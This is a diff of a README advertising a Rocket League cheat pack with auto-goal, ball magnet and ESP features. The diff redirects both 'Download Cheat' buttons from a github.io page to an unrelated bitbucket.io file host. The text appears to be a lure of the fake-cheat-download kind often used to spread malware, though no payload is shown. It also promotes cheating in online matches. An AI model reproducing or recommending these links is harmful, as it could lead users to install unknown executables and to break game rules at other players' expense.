@@ -4,7 +4,7 @@ Rocket League might look simple — soccer with cars, right? But once you dive i
 
 This cheat pack is more than just macros — we’re talking **auto-goal**, **perfect aerials**, **ball magnet**, and even ESP-style ball tracking. Play smarter, move cleaner, and *never* lose another 50/50.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/rocket-league/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 🔍 What Is the Rocket League Cheat?
@@ -13,7 +13,7 @@ The **Rocket League Cheat** is a private/external cheat designed to inject power
 
 Great for practicing mechanics, clowning in private lobbies, or ranking fast with smart config tweaks. 🚗💨
 
-[![Download Cheat](https://i.ytimg.com/vi/th2zxq_eAM0/hqdefault.jpg)](https://wecheaters.github.io/cheats/rocket-league/)
+[![Download Cheat](https://i.ytimg.com/vi/th2zxq_eAM0/hqdefault.jpg)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 🔥 Features List – What’s Inside?
